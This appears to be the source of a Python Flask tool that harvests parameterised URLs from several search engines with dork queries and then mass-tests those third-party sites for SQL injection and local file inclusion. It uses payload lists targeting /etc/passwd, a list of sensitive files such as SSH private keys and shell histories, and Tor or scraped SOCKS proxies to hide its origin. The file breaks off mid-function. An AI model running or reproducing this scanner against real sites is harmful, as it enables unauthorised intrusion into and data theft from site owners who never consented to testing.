import re
import time
import json
import random
import sqlite3
import urllib3
import argparse
import datetime
from ipwhois import IPWhois
from bs4 import BeautifulSoup
from json2html import json2html
from urllib.parse import urlparse
from urllib3 import Timeout, Retry
from urllib3.contrib.socks import SOCKSProxyManager
from flask import Flask, render_template, url_for, request, Response
from multiprocessing import Pool, freeze_support, Manager

app = Flask(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--tor", help="enable tor proxy", action='store_true')
parser.add_argument("-p", "--proxy", help="enable socks5 proxy", action='store_true')
parser.add_argument("-v", "--verbose", help="enable verbose mode", action='store_true')
args = parser.parse_args()

m = Manager()
proxy_list = m.list()
lfi_brute_data = m.list()
technologies_info = []
domains_list = []
clean_links = []
found_proxy = []
open_ports = []
links_buf = []
lfi_fuzz = []
url_list = []
links = []

dorker_urls = '''INSERT OR IGNORE INTO dorker_urls VALUES (?, ?, ?)'''
urls_to_check = '''INSERT OR IGNORE INTO urls_to_check VALUES (?, ?)'''

home_files = ["/.ssh/id_rsa",
              "/.ssh/known_hosts",
              "/.bash_history",
              "/.bash_logout",
              "/.bashrc",
              "/.bashrc.original",
              "/.python_history",
              "/.zsh_history",
              "/.zshrc",
              "/.htaccess",
              "/.htpasswd",
              "/.access.log",
              "/.error.log",
              "/robots.txt",
              "/index.php",
              "/index.html",
              "/publichtml/www/.htaccess",
              "/publichtml/.htaccess",
              "/public_html/www/.htaccess",
              "/public_html/.htaccess",
              "/_public_html/www/.htaccess",
              "/_public_html/.htaccess",
              "/public_html_/www/.htaccess",
              "/public_html_/.htaccess",
              "/_public_html_/www/.htaccess",
              "/_public_html_/.htaccess",
              "/public_html/www1/.htaccess",
              "/public_html/.htaccess",
              "/_public_html/www1/.htaccess",
              "/_public_html/.htaccess",
              "/public_html_/www1/.htaccess",
              "/public_html_/.htaccess",
              "/_public_html_/www1/.htaccess",
              "/_public_html_/.htaccess",
              "/public_html/www2/.htaccess",
              "/public_html/.htaccess",
              "/_public_html/www2/.htaccess",
              "/_public_html/.htaccess",
              "/public_html_/www2/.htaccess",
              "/public_html_/.htaccess",
              "/_public_html_/www2/.htaccess",
              "/_public_html_/.htaccess",
              "/public_html/www3/.htaccess",
              "/public_html/.htaccess",
              "/_public_html/www3/.htaccess",
              "/_public_html/.htaccess",
              "/public_html_/www3/.htaccess",
              "/public_html_/.htaccess",
              "/_public_html_/www3/.htaccess",
              "/_public_html_/.htaccess",
              "/publichtml/index.php",
              "/publichtml/index.html",
              "/public_html/index.php",
              "/public_html/index.html",
              "/public_html_/index.php",
              "/public_html_/index.html",
              "/_public_html_/index.php",
              "/_public_html_/index.html",
              "/httpdocs/.htaccess",
              "/httpdocs/.htpasswd",
              "/httpdocs/index.php",
              "/httpdocs/index.html"]

lfi_payloads = [
    r'/etc/passwd',
    r'/etc/passwd%00',
    r'../../../../../../../../../../../../../../../../../etc/passwd',
    r'../../../../../../../../../../../../../../../../../etc/passwd%00',
    r'/var/www/../../etc/passwd',
    r'..///////..////..//////etc/passwd',
    r'/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd',
    r'....\/....\/....\/etc/passwd',
    r'%252e%252e%252f%252e%252e%252fetc%252fpasswd',
    r'%252e%252e%252f%252e%252e%252fetc%252fpasswd%00',
    r'..%c0%af..%c0%af..%c0%afetc%c0%afpasswd']

sqli_payloads = [
    r"'",
    r"' OR 1=0#",
    r"' OR 1=0 --%20",
    r"' AND 1=0#",
    r"' AND 1=0 --%20",
    r"' ORDER BY 9999#",
    r"' ORDER BY 9999 --%20",
    r" OR 1=0#",
    r" OR 1=0 --%20",
    r" AND 1=0#",
    r" AND 1=0 --%20",
    r" ORDER BY 9999#",
    r" ORDER BY 9999 --%20"]

sqli_errors = [
    "You have an error in your SQL syntax",
    "Warning: mysql_fetch_array()",
    "Error Occurred While Processing Request",
    "Call to undefined function mysql_error"]

ua = ['Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; zh-cn) Opera 8.65',
      'Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.2)',
      'Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 6.0)',
      'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2)',
      'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; el-GR)',
      'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
      'Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN) AppleWebKit/533+ (KHTML, like Gecko)']


def splitter(url):
    if "=" in url and len(url.split("?")) == 2:
        try:
            u = url.split("=")
            if len(u) == 2:
                link1 = u[0] + "=PARAM"
                param1 = u[1]
                if link1 not in links_buf:
                    links_buf.append(link1)
                    clean_links.append([link1, param1])
            elif len(u) == 3:
                link2 = u[0] + "=PARAM&" + u[1].split("&")[1] + "=PARAM"
                param2 = u[1].split("&")[0] + ":" + u[2]
                if link2 not in links_buf:
                    links_buf.append(link2)
                    clean_links.append([link2, param2])
            elif len(u) == 4:
                link3 = u[0] + "=PARAM&" + u[1].split("&")[1] + "=PARAM&" + u[2].split("&")[1] + "=PARAM"
                param3 = u[1].split("&")[0] + ":" + u[2].split("&")[0] + ":" + u[3].split("&")[0]
                if link3 not in links_buf:
                    links_buf.append(link3)
                    clean_links.append([link3, param3])
            elif len(u) == 5:
                link4 = u[0] + "=PARAM&" + u[1].split("&")[1] + "=PARAM%" + u[2].split("&")[1] + "=PARAM%" + \
                        u[3].split("&")[1] + "=PARAM"
                param4 = u[1].split("&")[0] + ":" + u[2].split("&")[0] + ":" + u[3].split("&")[0] + ":" + \
                         u[4].split("&")[0]
                if link4 not in links_buf:
                    links_buf.append(link4)
                    clean_links.append([link4, param4])
        except Exception as ex:
            print("\n[!] Exception: " + str(ex) + "\n With URL: " + url)


def connector(url):
    try:
        u = url[0].split("PARAM")
        params = url[1].split(":")
        if len(u) == 2:
            link2 = u[0] + params[0]
            links_buf.append(link2)
        elif len(u) == 3:
            link3 = u[0] + params[0] + u[1] + params[1]
            links_buf.append(link3)
        elif len(u) == 4:
            link4 = u[0] + params[0] + u[1] + params[1] + u[2] + params[2]
            links_buf.append(link4)
        elif len(u) == 5:
            link5 = u[0] + params[0] + u[1] + params[1] + u[2] + params[2] + u[3] + params[3]
            links_buf.append(link5)
    except Exception as ex:
        print("\n[!] Exception: " + str(ex) + "\n With URL: " + url)


def header_gen():
    header = {
        'User-agent': random.choice(ua),
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'keep-alive'}

    try:
        if args.tor:
            http = SOCKSProxyManager("socks5h://127.0.0.1:9050", headers=header, cert_reqs=False, num_pools=30)
        elif args.proxy:
            if len(proxy_list) >= 1:
                http = SOCKSProxyManager("socks5h://" + str(random.choice(proxy_list)), headers=header, cert_reqs=False,
                                         num_pools=30)
        else:
            http = urllib3.PoolManager(headers=header, cert_reqs=False, num_pools=30)
    except Exception as ex:
        print(str(ex))
        http = urllib3.PoolManager(headers=header, cert_reqs=False, num_pools=30)

    return http


def builtwith(u, headers=None, html=None):
    techs = {}
    # Check URL
    for app_name, app_spec in data['apps'].items():
        if 'url' in app_spec:
            if contains(u, app_spec['url']):
                add_app(techs, app_name, app_spec)

    # Download content
    if None in (headers, html):
        try:
            req = header_gen().request("GET", u, retries=Retry(2), timeout=Timeout(5))
            if headers is None:
                headers = req.headers
            if html is None:
                try:
                    ht = BeautifulSoup(req.data, features="html.parser")
                    html = ht.prettify()
                except Exception as exc:
                    print(str(exc))
                    html = req.data.decode("latin-1")
        except Exception as e:
            print('Error:', e)

    # Check headers
    if headers:
        for app_name, app_spec in data['apps'].items():
            if 'headers' in app_spec:
                if contains_dict(headers, app_spec['headers']):
                    add_app(techs, app_name, app_spec)

    # Check html
    if html:
        for app_name, app_spec in data['apps'].items():
            for key in 'html', 'script':
                snippets = app_spec.get(key, [])
                if not isinstance(snippets, list):
                    snippets = [snippets]
                for snippet in snippets:
                    if contains(html, snippet):
                        add_app(techs, app_name, app_spec)
                        break

        # check meta
        # XXX add proper meta data parsing
        if isinstance(html, bytes):
            html = html.decode()
        metas = dict(re.compile('<meta[^>]*?name=[\'"]([^>]*?)[\'"][^>]*?content=[\'"]([^>]*?)[\'"][^>]*?>',
                                re.IGNORECASE).findall(html))
        for app_name, app_spec in data['apps'].items():
            for name, content in app_spec.get('meta', {}).items():
                if name in metas:
                    if contains(metas[name], content):
                        add_app(techs, app_name, app_spec)
                        break
    return techs


def add_app(techs, app_name, app_spec):
    for category in get_categories(app_spec):
        if category not in techs:
            techs[category] = []
        if app_name not in techs[category]:
            techs[category].append(app_name)
            implies = app_spec.get('implies', [])
            if not isinstance(implies, list):
                implies = [implies]
            for app_name in implies:
                add_app(techs, app_name, data['apps'][app_name])


def get_categories(app_spec):
    return [data['categories'][str(c_id)] for c_id in app_spec['cats']]


def contains(v, regex):
    if isinstance(v, bytes):
        v = v.decode()
    if len(v) > 870000:
        string_len = len(v)
        part_size = string_len // 1000
        step = part_size
        for _ in range(string_len // part_size):
            part = v[:step]
            v = v[step - 1:]
            step += part_size
            if step > string_len:
                break
            res = re.compile(regex.split('\\;')[0], flags=re.IGNORECASE).search(part)
            if res:
                return res
    else:
        return re.compile(regex.split('\\;')[0], flags=re.IGNORECASE).search(v)


def contains_dict(d1, d2):
    for k2, v2 in d2.items():
        v1 = d1.get(k2)
        if v1:
            if not contains(v1, v2):
                return False
        else:
            return False
    return True


@app.route("/cmsinfo")
def technologies():
    global technologies_info
    url = request.args.get("url", default="none", type=str)
    technologies_info.clear()
    if url != "none":
        if "," in url:
            urls = url.split(",")
            for u in urls:
                print("\n" + str(u))
                technologies_info = builtwith(u)
                for i in sorted(technologies_info.items()):
                    print('%s: %s' % i)
                    # info.append('%s: %s' % i)
        else:
            technologies_info = builtwith(url)
            for i in sorted(technologies_info.items()):
                print('%s: %s' % i)
                # info.append('%s: %s' % i)

    return render_template("tools.html", data=json2html.convert(json=json.dumps(technologies_info, indent=4)),
                           tool="Site technologies")


@app.route("/cmsinfo")
def cms_info():
    url = request.args.get("site", default="none", type=str)
    info = []
    info.clear()
    cms_inf = ''
    if url != "none":
        if "," in url:
            urls = url.split(",")
            for u in urls:
                print("\n" + str(u))
                cms_inf = builtwith(u)
                for i in sorted(cms_inf.items()):
                    print('%s: %s' % i)
                info.append(cms_inf)
            return render_template("tools.html", data=json2html.convert(json=json.dumps(info, indent=4)),
                                   tool="Site technologies")

        else:
            cms_inf = builtwith(url)
            for i in sorted(cms_inf.items()):
                print('%s: %s' % i)

    return render_template("tools.html", data=json2html.convert(json=json.dumps(cms_inf, indent=4)),
                           tool="Site technologies")


@app.route("/whois")
def whois():
    ip = request.args.get("ip", default="none", type=str)
    result = {}
    if ip != "none":
        info = IPWhois(ip).lookup_rdap(depth=1)
        result['info'] = info
        entity = info['entities'][0]
        result['entity'] = entity
        name = info['objects'][entity]['contact']['name']
        result['name'] = name
        print(json.dumps(result, indent=4))

    return render_template("tools.html", data=json2html.convert(json=json.dumps(result, indent=4)), tool="Whois")


def dorker(dork):
    db = sqlite3.connect("dorker.db")
    sql = db.cursor()
    sql.execute('''CREATE TABLE IF NOT EXISTS dorker_urls (date_ TEXT, dork_ TEXT, url_ TEXT PRIMARY KEY)''')
    sql.execute('''CREATE TABLE IF NOT EXISTS urls_to_check (date_ TEXT, url_ TEXT PRIMARY KEY)''')
    db.commit()

    for page in range(1, 16):
        time.sleep(0.2)

        # SEARCH-RESULTS.COM
        try:
            send1 = header_gen().request("GET", "http://www1.search-results.com/web?q=" + dork + "&page=" + str(page),
                                         retries=Retry(3), timeout=Timeout(6))
            try:
                parsing1 = BeautifulSoup(send1.data, features="html.parser")
            except Exception as ex:
                print("Error:\n" + str(ex) + "Trying latin-1...")
                parsing1 = BeautifulSoup(send1.data.decode('latin-1'), features="html.parser")

            for url in parsing1.find_all("cite"):
                if url.string:
                    if "http" in str(url.string):
                        url_string = str(url.string)
                        print(url_string)
                    else:
                        url_string = "http://" + str(url.string)
                        print(url_string)
                    if "=" in str(url_string):
                        sql.execute(urls_to_check, (str(datetime.date.today()), str(url_string)))
                        sql.execute(dorker_urls, (str(datetime.date.today()), str(dork), str(url_string)))
                        db.commit()
                    else:
                        sql.execute(dorker_urls, (str(datetime.date.today()), str(dork), str(url_string)))
                        db.commit()

        except Exception as ex:
            print("\nError:\n" + str(ex) + "\nEngine: SEARCH-RESULTS.COM\n")

        # SEARCH.AUONE.JP
        try:
            send2 = header_gen().request("GET", "https://search.auone.jp/?q=" + dork + "&ie=UTF-8&page=" + str(page),
                                         retries=Retry(3), timeout=Timeout(6))

            try:
                parsing2 = BeautifulSoup(send2.data, features="html.parser")
            except Exception as ex:
                print("Error:\n" + str(ex) + "Trying latin-1...")
                parsing2 = BeautifulSoup(send2.data.decode('latin-1'), features="html.parser")

            for u in parsing2.find_all("h2", class_="web-Result__site u-TextEllipsis"):
                if u:
                    for url in u.find_all("a"):
                        if url.get('href'):
                            if "http" in str(url.get("href")):
                                url_string = str(url.get('href'))
                                print(url_string)
                            else:
                                url_string = "http://" + str(url.get('href'))
                                print(url_string)
                            if "=" in str(url_string):
                                sql.execute(urls_to_check, (str(datetime.date.today()), str(url_string)))
                                sql.execute(dorker_urls, (str(datetime.date.today()), str(dork), str(url_string)))
                                db.commit()
                            else:
                                sql.execute(dorker_urls, (str(datetime.date.today()), str(dork), str(url_string)))
                                db.commit()

        except Exception as ex:
            print("\nError:\n" + str(ex) + "\nEngine: SEARCH.AUONE.JP\n")

        # LITE.QWANT.COM
        try:
            send3 = header_gen().request("GET", "https://lite.qwant.com/?q=" + dork + "&p=" + str(page),
                                         retries=Retry(3), timeout=Timeout(6))

            try:
                parsing3 = BeautifulSoup(send3.data, features="html.parser")
            except Exception as ex:
                print("Error:\n" + str(ex) + "Trying latin-1...")
                parsing3 = BeautifulSoup(send3.data.decode('latin-1'), features="html.parser")

            for url in parsing3.find_all("p", class_="url"):
                if url.string:
                    if "http" in str(url.string.replace(" ", "")):
                        url_string = str(url.string.replace(" ", ""))
                        print(url_string)
                    else:
                        url_string = "http://" + str(url.string.replace(" ", ""))
                        print(url_string)
                    if "=" in str(url_string):
                        sql.execute(urls_to_check, (str(datetime.date.today()), str(url_string)))
                        sql.execute(dorker_urls, (str(datetime.date.today()), str(dork), str(url_string)))
                        db.commit()
                    else:
                        sql.execute(dorker_urls, (str(datetime.date.today()), str(dork), str(url_string)))
                        db.commit()

        except Exception as ex:
            print("\nError:\n" + str(ex) + "\nEngine: LITE.QWANT.COM\n")

        # SEARCH.LILO.ORG
        try:
            send4 = header_gen().request("GET", "https://search.lilo.org/?q=" + dork + "&date=All&page=" + str(page),
                                         retries=Retry(3), timeout=Timeout(6))

            try:
                parsing4 = BeautifulSoup(send4.data, features="html.parser")
            except Exception as ex:
                print("Error:\n" + str(ex) + "Trying latin-1...")
                parsing4 = BeautifulSoup(send4.data.decode('latin-1'), features="html.parser")
            for url in parsing4.find_all("a", class_="resulturl d-block"):
                if url.get('href'):
                    if "http" in str(url.get("href")):
                        url_string = str(url.get('href'))
                        print(url_string)
                    else:
                        url_string = "http://" + str(url.get('href'))
                        print(url_string)
                    if "=" in str(url_string):
                        sql.execute(urls_to_check, (str(datetime.date.today()), str(url_string)))
                        sql.execute(dorker_urls, (str(datetime.date.today()), str(dork), str(url_string)))
                        db.commit()
                    else:
                        sql.execute(dorker_urls, (str(datetime.date.today()), str(dork), str(url_string)))
                        db.commit()

        except Exception as ex:
            print("\nError:\n" + str(ex) + "\nEngine: SEARCH.LILO.ORG\n")

        # INT.SEARCH.MYWEBSEARCH.COM
        try:
            send5 = header_gen().request("GET", "https://int.search.mywebsearch.com/mywebsearch/GGmain.jhtml?searchfor="
                                         + dork + "&pn=" + str(page), retries=Retry(3), timeout=Timeout(6))

            try:
                parsing5 = BeautifulSoup(send5.data, features="html.parser")
            except Exception as ex:
                print("Error:\n" + str(ex) + "Trying latin-1...")
                parsing5 = BeautifulSoup(send5.data.decode('latin-1'), features="html.parser")
            for url in parsing5.find_all("cite"):
                if url.string:
                    if "http" in url.string:
                        url_string = url.string
                        print(url_string)
                    else:
                        url_string = "http://" + url.string
                        print(url_string)
                    if "=" in str(url_string):
                        sql.execute(urls_to_check, (str(datetime.date.today()), str(url_string)))
                        sql.execute(dorker_urls, (str(datetime.date.today()), str(dork), str(url_string)))
                        db.commit()
                    else:
                        sql.execute(dorker_urls, (str(datetime.date.today()), str(dork), str(url_string)))
                        db.commit()

        except Exception as ex:
            print("\nError:\n" + str(ex) + "\nEngine: INT.SEARCH.MYWEBSEARCH.COM\n")

        # KVASIR.NO
        try:
            send6 = header_gen().request("GET", "https://www.kvasir.no/alle?offset=" + str(page * 10) + "&q=" + dork,
                                         retries=Retry(3), timeout=Timeout(6))

            try:
                parsing6 = BeautifulSoup(send6.data, features="html.parser")
            except Exception as ex:
                print("Error:\n" + str(ex) + "Trying latin-1...")
                parsing6 = BeautifulSoup(send6.data.decode('latin-1'), features="html.parser")

            for url in parsing6.find_all("p", class_="Source-sc-3jcynm-0 kBIaaJ"):
                if url.string:
                    if "http" in url.string:
                        url_string = url.string
                        print(url_string)
                    else:
                        url_string = "http://" + url.string
                        print(url_string)
                    if "=" in url_string:
                        sql.execute(urls_to_check, (str(datetime.date.today()), str(url_string)))
                        sql.execute(dorker_urls, (str(datetime.date.today()), str(dork), str(url_string)))
                        db.commit()
                    else:
                        sql.execute(dorker_urls, (str(datetime.date.today()), str(dork), str(url_string)))
                        db.commit()

        except Exception as ex:
            print("\nError:\n" + str(ex) + "\nEngine: KVASIR.NO\n")

    db.close()


@app.route("/dorker")
def dorker_route():
    dorks = request.args.get("dorks", default="none", type=str)
    db = sqlite3.connect("dorker.db")
    sql = db.cursor()
    sql.execute('''CREATE TABLE IF NOT EXISTS dorker_urls (date_ TEXT, dork_ TEXT, url_ TEXT PRIMARY KEY)''')
    db.commit()

    if dorks != "none":
        dorks_list = dorks.split(",")
        print(dorks_list)

        pool = Pool(len(dorks_list))
        pool.map(dorker, dorks_list)
        pool.close()
        pool.join()

    return render_template("tools.html", data=sql.execute(r"SELECT * FROM dorker_urls ORDER BY date_ DESC LIMIT 100"),
                           tool="Dorker")


def lfi_checker(site):
    db = sqlite3.connect("dorker.db")
    sql = db.cursor()
    sql.execute('''CREATE TABLE IF NOT EXISTS vuln_urls (date_ TEXT, url_ TEXT PRIMARY KEY)''')
    db.commit()
    today = datetime.date.today()
    if "=" in site:
        number_of_parameters = len(site.split("="))
        if number_of_parameters == 2 or number_of_parameters >= 4 or len(site.split("?")) >= 3:
            for exploit in lfi_payloads:
                if args.verbose:
                    print("Trying payload: " + exploit + "\nFor URL: " + site)
                try:
                    # Request with payload
                    url1 = site.split("=")[0] + "=" + exploit
                    http_request1 = header_gen().request("GET", url1, retries=Retry(3), timeout=Timeout(6))
                    try:
                        http_response1 = str(http_request1.data.decode("utf-8"))
                    except Exception as ex:
                        if "codec can't decode byte" in str(ex):
                            http_response1 = str(http_request1.data.decode("latin-1"))
                        else:
                            print("\n[!] Exception: " + str(ex) + "\n With URL: " + site)
                    if "root:" in http_response1:
                        print("[*] URL seems vulnerable to LFI: " + url1)
                        sql.execute('''INSERT OR IGNORE INTO vuln_urls VALUES (?, ?)''', (str(today), url1))
                        db.commit()

                except Exception as ex:
                    if "Max retries exceeded with url" in str(ex):
                        print("[!] Max retries exceeded with URL: %s" % site)
                    else:
                        print("\n[!] Exception: " + str(ex) + "\n With URL: " + site)

        elif number_of_parameters == 3:
            for exploit in lfi_payloads:
                if args.verbose:
                    print("Trying payload: " + exploit + "\nFor URL: " + site)
                try:
                    # Request with payload
                    url2 = site.split("&")[0] + "&" + site.split("&")[1].split("=")[0] + "=" + exploit
                    http_request2 = header_gen().request("GET", url2, retries=Retry(3), timeout=Timeout(6))
                    try:
                        http_response2 = str(http_request2.data.decode("utf-8"))
                    except Exception as ex:
                        if "codec can't decode byte" in str(ex):
                            http_response2 = str(http_request2.data.decode("latin-1"))
                        else:
                            print("\n[!] Exception: " + str(ex) + "\n With URL: " + site)
                    if "root:" in http_response2:
                        print("[*] URL seems vulnerable to LFI: " + url2)
                        sql.execute('''INSERT OR IGNORE INTO vuln_urls VALUES (?, ?)''', (str(today), url2))
                        db.commit()

                except Exception as ex:
                    if "Max retries exceeded with url" in str(ex):
                        print("[!] Max retries exceeded with URL: %s" % site)
                    else:
                        print("\n[!] Exception: " + str(ex) + "\n With URL: " + site)

                try:
                    # Request with payload
                    url3 = site.split("&")[0].split("=")[0] + "=" + exploit + "&" + site.split("&")[1]
                    http_request3 = header_gen().request("GET", url3, retries=Retry(3), timeout=Timeout(6))
                    try:
                        http_response3 = str(http_request3.data.decode("utf-8"))
                    except Exception as ex:
                        if "codec can't decode byte" in str(ex):
                            http_response3 = str(http_request3.data.decode("latin-1"))
                        else:
                            print("\n[!] Exception: " + str(ex) + "\n With URL: " + site)
                    if "root:" in http_response3:
                        print("[*] URL seems vulnerable to LFI: " + url3)
                        sql.execute('''INSERT OR IGNORE INTO vuln_urls VALUES (?, ?)''', (str(today), url3))
                        db.commit()

                except Exception as ex:
                    if "Max retries exceeded with url" in str(ex):
                        print("[!] Max retries exceeded with URL: %s" % site)
                    else:
                        print("\n[!] Exception: " + str(ex) + "\n With URL: " + site)

                try:
                    # Request with payload
                    url4 = site.split("=")[0] + "=" + exploit
                    http_request4 = header_gen().request("GET", url4, retries=Retry(3), timeout=Timeout(6))
                    try:
                        http_response4 = str(http_request4.data.decode("utf-8"))
                    except Exception as ex:
                        if "codec can't decode byte" in str(ex):
                            http_response4 = str(http_request4.data.decode("latin-1"))
                        else:
                            print("\n[!] Exception: " + str(ex) + "\n With URL: " + site)
                    if "root:" in http_response4:
                        print("[*] URL seems vulnerable to LFI: " + url4)
                        sql.execute('''INSERT OR IGNORE INTO vuln_urls VALUES (?, ?)''', (str(today), url4))
                        db.commit()

                except Exception as ex:
                    if "Max retries exceeded with url" in str(ex):
                        print("[!] Max retries exceeded with URL: %s" % site)
                    else:
                        print("\n[!] Exception: " + str(ex) + "\n With URL: " + site)

                try:
                    # Request with payload
                    url5 = site.split("?")[0] + "?" + site.split("&")[1].split("=")[0] + "=" + exploit
                    http_request5 = header_gen().request("GET", url5, retries=Retry(3), timeout=Timeout(6))
                    try:
                        http_response5 = str(http_request5.data.decode("utf-8"))
                    except Exception as ex:
                        if "codec can't decode byte" in str(ex):
                            http_response5 = str(http_request5.data.decode("latin-1"))
                        else:
                            print("\n[!] Exception: " + str(ex) + "\n With URL: " + site)
                    if "root:" in http_response5:
                        print("[*] URL seems vulnerable to LFI: " + url5)
                        sql.execute('''INSERT OR IGNORE INTO vuln_urls VALUES (?, ?)''', (str(today), url5))
                        db.commit()

                except Exception as ex:
                    if "Max retries exceeded with url" in str(ex):
                        print("[!] Max retries exceeded with URL: %s" % site)
                    else:
                        print("\n[!] Exception: " + str(ex) + "\n With URL: " + site)

    else:
        print("[!] Skipping: " + site)


def sqli_checker(site):
    db = sqlite3.connect("dorker.db")
    sql = db.cursor()
    sql.execute('''CREATE TABLE IF NOT EXISTS vuln_urls (date_ TEXT, url_ TEXT PRIMARY KEY)''')
    db.commit()
    today = datetime.date.today()
    if "=" in site:
        if len(site.split("=")) == 2 or len(site.split("=")) >= 4 or len(site.split("?")) >= 3:
            for exploit in sqli_payloads:
                if args.verbose:
                    print("Trying payload: " + exploit + "\nFor URL: " + site)
                try:
                    # Request with payload
                    url1 = site + exploit
                    send1 = header_gen().request("GET", url1, retries=Retry(3), timeout=Timeout(6))
                    try:
                        p1 = BeautifulSoup(send1.data.decode("utf-8"), features="html.parser")
                    except Exception as ex:
                        if "codec can't decode byte" in str(ex):
                            p1 = BeautifulSoup(send1.data.decode("latin-1"), features="html.parser")
                        else:
                            print("\n[!] Exception: " + str(ex) + "\n With URL: " + site)

                    for error in sqli_errors:
                        if error in p1:
                            print("[*] URL seems vulnerable to SQLi: " + site + exploit)
                            sql.execute('''INSERT OR IGNORE INTO vuln_urls VALUES (?, ?)''', (str(today), url1))
                            db.commit()

                except Exception as ex:
                    if "Max retries exceeded with url" in str(ex):
                        print("[!] Max retries exceeded with URL: %s" % site)
                    else:
                        print("\n[!] Exception: " + str(ex) + "\n With URL: " + site)

        elif len(site.split("=")) == 3:
            for exploit in sqli_payloads:
                if args.verbose:
                    print("Trying payload: " + exploit + "\nFor URL: " + site)
                try:
                    # Request with payload
                    url2 = site.split("&")[0] + exploit + "&" + site.split("&")[1]
                    send2 = header_gen().request("GET", url2, retries=Retry(3), timeout=Timeout(6))
                    try:
                        p2 = BeautifulSoup(send2.data.decode("utf-8"), features="html.parser")
                    except Exception as ex:
                        if "codec can't decode byte" in str(ex):
                            p2 = BeautifulSoup(send2.data.decode("latin-1"), features="html.parser")
                        else:
                            print("\n[!] Exception: " + str(ex) + "\n With URL: " + site)

                    for error in sqli_errors:
                        if error in p2:
                            print("[*] URL seems vulnerable to SQLi: " + url2)
                            sql.execute('''INSERT OR IGNORE INTO vuln_urls VALUES (?, ?)''', (str(today), url2))
                            db.commit()

                except Exception as ex:
                    if "Max retries exceeded with url" in str(ex):
                        print("[!] Max retries exceeded with URL: %s" % site)
                    else:
                        print("\n[!] Exception: " + str(ex) + "\n With URL: " + site)

                try:
                    # Request with payload
                    url3 = site + exploit
                    send3 = header_gen().request("GET", url3, retries=Retry(3), timeout=Timeout(6))
                    try:
                        p3 = BeautifulSoup(send3.data.decode("utf-8"), features="html.parser")
                    except Exception as ex:
                        if "codec can't decode byte" in str(ex):
                            p3 = BeautifulSoup(send3.data.decode("latin-1"), features="html.parser")
                        else:
                            print("\n[!] Exception: " + str(ex) + "\n With URL: " + site)

                    for error in sqli_errors:
                        if error in p3:
                            print("[*] URL seems vulnerable to SQLi: " + url3)
                            sql.execute('''INSERT OR IGNORE INTO vuln_urls VALUES (?, ?)''', (str(today), url3))
                            db.commit()

                except Exception as ex:
                    if "Max retries exceeded with url" in str(ex):
                        print("[!] Max retries exceeded with URL: %s" % site)
                    else:
                        print("\n[!] Exception: " + str(ex) + "\n With URL: " + site)

    else:
        print("[!] Skipping: " + site)


@app.route("/sqli_lfi")
def sqli_lfi():
    global links, clean_links, links_buf
    limit = request.args.get("limit", default="none", type=str)
    links.clear()
    clean_links.clear()
    links_buf.clear()

    db = sqlite3.connect("dorker.db")
    sql = db.cursor()
    sql.execute('''CREATE TABLE IF NOT EXISTS vuln_urls (date_ TEXT, url_ TEXT PRIMARY KEY)''')
    db.commit()

    if limit != "none":
        # SELECT url_ FROM dorker_urls WHERE url_ LIKE '%=%'
        for site in sql.execute("""SELECT url_ from urls_to_check ORDER BY date_ DESC LIMIT """ + limit):
            if "=" in site[0]:
                if site[0] not in links:
                    links.append(site[0])

        print("\nURLs from database:\n")
        for link in links:
            print(link)

        for link in links:
            splitter(link)

        links_buf.clear()

        for link in clean_links:
            connector(link)

        print("\nURLs that will be tested:\n")
        for link in links_buf:
            print(link)

        print("\nSQLi\n")
        pool = Pool(len(links_buf) // 2)
        pool.map(sqli_checker, links_buf)
        pool.close()
        pool.join()

        print("\nLFI\n")
        pool = Pool(len(links_buf) // 2)
        pool.map(lfi_checker, links_buf)
        pool.close()
        pool.join()

        print("\n\n\nDeleting old links...")

        for site in links:
            sql.execute("""DELETE FROM urls_to_check WHERE url_ = '""" + str(site) + "'")
            db.commit()

        print("\n\n\nDone!")

    return render_template("tools.html", data=sql.execute("""SELECT * from vuln_urls ORDER BY url_ DESC"""),
                           tool="SQLi and LFI checker")


@app.route("/reverse_ip")
def reverse_ip():
    global domains_list
    ip = request.args.get("ip", default="none", type=str)
    domains_list.clear()

    if ip != "none":
        send = header_gen().request("GET", "https://reverseip.domaintools.com/search/?q=" + str(ip), retries=Retry(4),
                                    timeout=Timeout(5))
        parsing = BeautifulSoup(send.data, features="html.parser")
        for d in parsing.find_all("span", title=str(ip)):
            if d.string is not None:
                domains_list.append(d.string)

    return render_template("tools.html", data=domains_list, tool="Reverse IP lookup")


@app.route("/subdomains")
def subdomains():
    global domains_list
    domain = request.args.get("domain", default="none", type=str)
    domains_list.clear()

    if domain != "none":
        send = header_gen().request("GET", "https://dns.bufferover.run/dns?q=" + domain, retries=Retry(4),
                                    timeout=Timeout(5))
        try:
            parsing = send.data.decode("utf-8")
        except Exception as exc:
            print("Error:\n" + str(exc) + "Trying latin-1...")
            parsing = send.data.decode('latin-1')
        json_response = json.loads(parsing)
        subdomain_list = json_response['FDNS_A']
        if subdomain_list is not None:
            for subdomain in subdomain_list:
                domains_list.append(subdomain)

    return render_template("tools.html", data=domains_list, tool="Subdomain lookup")


@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404


@app.route("/myip")
def myip():
    ip_info = ""
    try:
        req = header_gen().request("GET", "ipinfo.io/ip", retries=Retry(4), timeout=Timeout(5))
        ip_info = req.data.decode("utf-8")
    except Exception as exc:
        print(str(exc))
    return render_template("tools.html", data=ip_info, tool="My IP")


def parse_proxy():
    global found_proxy, proxy_list
    page = header_gen().request("GET", "https://spys.one/en/socks-proxy-list/", retries=Retry(3), timeout=Timeout(5))
    pattern = re.compile(r'onmouseout.*?spy14>(.*?)<s.*?write.*?nt>\"\+(.*?)\)</scr.*?en(.*?)-', re.S)
    info = re.findall(pattern, page.data.decode("utf-8"))
    port_passwd = {}
    portcode = (re.findall('table><script type="text/javascript">(.*)</script>',
                           page.data.decode("utf-8")))[0].split(';')
    for code in portcode:
        ii = re.findall(r'\w+=\d+', code)
        for i in ii:
            kv = i.split('=')
            if len(kv[1]) == 1:
                k = kv[0]
                v = kv[1]
